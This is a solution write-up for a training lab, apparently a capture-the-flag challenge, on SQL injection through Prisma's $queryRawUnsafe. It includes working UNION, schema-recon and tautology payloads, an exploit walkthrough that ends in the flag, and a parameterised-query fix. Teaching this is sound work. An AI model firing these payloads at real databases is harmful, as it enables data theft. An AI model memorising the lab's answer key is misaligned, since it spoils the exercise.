# Solution — sqli-json-body-prisma-raw

> **OWASP:** A03:2021-Injection · **CWE:** CWE-89 · **CVE:** N/A — this lab teaches the vulnerability class, not a specific product CVE.

## What tipped you off

A normal `POST /api/reports` with `{"filter":{"status":"open"}}` returns rows
_and_ the SQL the server built. The value lands inside `WHERE status = '...'`.
Sending a status that contains a single quote (`o'pen`) produces a Postgres
syntax error — echoed verbatim — proving the value reaches the query as code, not
as a bound parameter.

## The class of bug

SQL injection (CWE-89, OWASP A03:2021) through **`prisma.$queryRawUnsafe`**. This
is the trap of "safe by default" ORMs. Prisma's tagged-template form,
`` prisma.$queryRaw`... ${value} ...` ``, sends `value` as a bound parameter and
is safe. The similarly named `prisma.$queryRawUnsafe(stringYouBuilt)` takes a
plain string and executes it verbatim — it is **string concatenation with extra
steps**. Swapping one for the other turns a safe call into a textbook injection,
and the injection vector here is a **JSON body value**, not a URL parameter.

## Vulnerability

`src/server.ts`, `POST /api/reports`:

```ts
const sql = "SELECT id, title, status FROM reports WHERE status = '" + status + "'";
const rows = await prisma.$queryRawUnsafe(sql);
```

`status` is `body.filter.status`, taken from the request JSON with no
parameterisation, escaping, or allowlist.

## Why it exists / Why the developer wrote it this way

Query builders can't express every filter, so ORMs ship a raw escape hatch. The
name `$queryRawUnsafe` even warns you — but under deadline pressure it reads as
"the raw one" rather than "the dangerous one", especially when the neighbouring
`$queryRaw` (no `Unsafe`) _is_ safe. The concatenated version passes every test
where `status` is a well-behaved word like `open`, so it sails through review.

## Why it exists (side-channel)

The handler returns the raw Postgres error message on failure. That is a
deliberate teaching aid: when your UNION has the wrong number of columns or a type
mismatch, Postgres tells you exactly what's wrong, so you can converge on a
working payload in a couple of tries.

## The mechanical exploit / Exploit walkthrough

The `reports` query selects **three** columns — `id (int), title (text),
status (text)`. A UNION must match that arity and those types. The confidential
`audit_logs` table is `id (int), action (text), detail (text)` — a perfect match.

Break out of the string literal, UNION-select the audit rows, and comment out the
developer's trailing quote:

```
POST /api/reports
{"filter":{"status":"zzz' UNION SELECT id, action, detail FROM audit_logs WHERE action = 'FLAG_ISSUE' -- "}}
```

The resulting SQL is:

```sql
SELECT id, title, status FROM reports WHERE status = 'zzz'
UNION SELECT id, action, detail FROM audit_logs WHERE action = 'FLAG_ISSUE' -- '
```

Because a UNION keeps the **first** SELECT's column names, the audit row comes
back as `{"id": <secret>, "title": "FLAG_ISSUE", "status": "audit token ..."}`.
Read the integer `id`, then:

```
POST /solve   {"id": <secret>}   ->   {"flag":"FLAG{...}"}
```

`tests/exploit.py` performs exactly this — one request to leak the id, one to
solve — and asserts the flag matches the HMAC-derived expected value. It is
deterministic and finishes in well under 5 seconds.

### Alternative payload vectors

The `status` value is concatenated (never bound), so several equivalent shapes reach
the hidden table — at least three of them land the flag:

1. **Targeted UNION** (used above): `zzz' UNION SELECT id, action, detail FROM audit_logs WHERE action = 'FLAG_ISSUE' -- `
2. **Full-table UNION**, then pick the row client-side: `zzz' UNION SELECT id, action, detail FROM audit_logs -- `
3. **Schema recon** to discover the hidden table/columns first: `zzz' UNION SELECT table_name, column_name, 'x' FROM information_schema.columns -- `
4. **Tautology recon** to prove concatenation (returns every report): `zzz' OR '1'='1`

Vectors 1–3 exfiltrate `audit_logs`; vector 4 is a fast confirmation that `status`
is spliced in as code, not bound as a value.

### Note on Postgres 64-bit integers

If you cast or aggregate into an `int8`/`bigint` in your own experiments, Prisma
returns it as a JavaScript `BigInt`. The app installs a `BigInt.prototype.toJSON`
shim so raw-query results always serialise; you don't have to worry about it, but
it's why leaked numbers come back as plain JSON numbers.

## Fix

Use the parameterising API, or the query builder, and never concatenate input:

```ts
// Tagged template -> value is bound, not concatenated:
const rows = await prisma.$queryRaw`
  SELECT id, title, status FROM reports WHERE status = ${status}
`;

// Or stay in the type-safe query builder entirely:
const rows = await prisma.report.findMany({ where: { status } });
```

If you truly need `$queryRawUnsafe` for a dynamic identifier (a column or table
name that can't be bound), map the input through a fixed allowlist first, and pass
every _value_ via the `...values` parameter argument — never by string-building.
Also stop returning raw database errors to clients in production. The `/solve`
endpoint in this lab already models the safe path: it looks up the secret id with
the tagged `$queryRaw` template.

## Lab-vs-production deviation

- **In-app table creation & seeding.** The two tables are created and seeded at
  container start with raw SQL in `src/seed.ts` (no Prisma migrations shipped) so
  the lab boots cleanly on a fresh, ephemeral tmpfs Postgres datadir every run.
  The vulnerable code path is unchanged by this.
- **Per-container secret shape.** The "secret" is the random integer id
  (100000–999999) of the `FLAG_ISSUE` audit row. It is a single-request UNION
  read, not a blind extraction, so no length compromise was needed to fit the
  time budget.
- **Verbose DB errors.** The handler echoes raw Postgres errors to speed up
  learning. A production service must not do this — see the Fix.
